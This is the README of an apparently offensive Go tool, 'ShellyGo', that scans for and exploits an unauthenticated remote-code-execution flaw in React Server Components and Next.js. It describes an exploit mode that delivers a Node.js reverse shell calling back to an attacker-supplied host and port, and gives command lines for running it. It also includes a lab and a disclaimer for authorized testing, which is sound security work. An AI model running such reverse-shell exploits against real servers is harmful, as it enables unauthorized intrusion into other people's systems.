# ShellyGo

```
   _____ __         ____       ______
  / ___// /_  ___  / / /_  __/ ____/___
  \__ \/ __ \/ _ \/ / / / / / / __/ __ \
 ___/ / / / /  __/ / / /_/ / /_/ / /_/ /
/____/_/ /_/\___/_/_/\__, /\____/\____/
                    /____/
```

A lightweight React2Shell (CVE-2025-55182 & CVE-2025-66478) scanner and exploiter written in pure Go with zero dependencies.

> **DISCLAIMER**: This tool is provided for educational purposes and authorized security testing only. Only use it on systems you own or have explicit written authorization to test. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.

---

## Vulnerability

React Server Components (RSC) in React 19.0–19.2 / Next.js 15–16 (App Router) are vulnerable to Remote Code Execution through the Flight protocol deserialization. A missing `hasOwnProperty` check allows prototype chain traversal to the `Function` constructor, enabling arbitrary code execution on the server.

| Detail | Value |
|--------|-------|
| CVEs | CVE-2025-55182, CVE-2025-66478 |
| Impact | Unauthenticated RCE |
| Affected | React 19.0–19.2, Next.js 15–16 (App Router with Server Actions) |
| Type | Prototype pollution → deserialization → Function constructor |

---

## Features

| Mode | Description |
|------|-------------|
| `scan` | **Scanner**: sends a safe payload (`console.log(7*7+1)`) to detect if the target is vulnerable without causing damage |
| `exploit` | **Exploiter**: deploys a pure Node.js reverse shell — starts a local TCP listener, sends the payload, and drops you into an interactive shell |

---

## Requirements

- Go 1.21+ (to build from source)
- No external dependencies — standard library only

---

## Installation

```bash
git clone https://github.com/0rty/shellygo.git
cd shellygo
go build -o shellygo main.go
```

Or download a precompiled binary from [Releases](https://github.com/0rty/shellygo/releases).

---

## Usage

```
./shellygo -u <target_url> -m <mode> [-l <lhost>] [-p <lport>]
```

### Arguments

| Argument | Description | Required |
|----------|-------------|----------|
| `-u` | Target URL | ✅ Always |
| `-m` | Mode: `scan` or `exploit` (default: `scan`) | ❌ |
| `-l` | Local host (your IP) | `exploit` only |
| `-p` | Local port (listener) | `exploit` only |
| `-h` | Show help | ❌ |

### Examples

```bash
# Scan a target
./shellygo -u http://target.com

# Exploit with reverse shell
./shellygo -u http://target.com -m exploit -l 10.10.14.5 -p 4444
```

---

## How It Works

### Scan Mode

```
ShellyGo                          Target (Next.js)
   │                                    │
   │  POST multipart/form-data          │
   │  Header: Next-Action: x            │
   │  Payload: console.log(7*7+1)       │
   │ ──────────────────────────────────→ │
   │                                    │
   │         Flight protocol            │
   │     deserializes the payload       │
   │     → Function("console.log(50)")  │
   │                                    │
   │  HTTP 500 + E{"digest"...}         │
   │ ←────────────────────────────────── │
   │                                    │
   │  [+] Target seems vulnerable       │
```

The scanner sends a harmless `console.log(7*7+1)` — if the server executes it (prints `50` in its logs) and returns a 500 with a digest error, it confirms RCE.

### Exploit Mode

```
ShellyGo                          Target (Next.js)
   │                                    │
   │  1. Start TCP listener on lport    │
   │                                    │
   │  2. POST exploit payload           │
   │     (pure Node.js reverse shell)   │
   │ ──────────────────────────────────→ │
   │                                    │
   │         Server executes:           │
   │     net.connect(lhost:lport)       │
   │     child_process.spawn('/bin/sh') │
   │                                    │
   │  3. Reverse shell connects back    │
   │ ←────────────────────────────────── │
   │                                    │
   │  [+] Interactive shell as www-data │
```

The exploit uses a pure Node.js reverse shell (no `bash` or `/dev/tcp` needed) — it works even in minimal containers without a shell.

---

## Test Lab

A vulnerable Docker lab is included for safe testing.

### Setup

```bash
cd lab
docker build -t shellygo-lab .
docker run -p 3000:3000 shellygo-lab
```

This runs a vulnerable Next.js 15.1.0 + React 19.0.0 application on `http://localhost:3000`.

### Test

```bash
# Terminal 1 — scan
./shellygo -u http://localhost:3000

# Terminal 2 — exploit (replace with your IP)
./shellygo -u http://localhost:3000 -m exploit -l 172.17.0.1 -p 4444
```

---

## License

MIT — see [LICENSE](LICENSE).
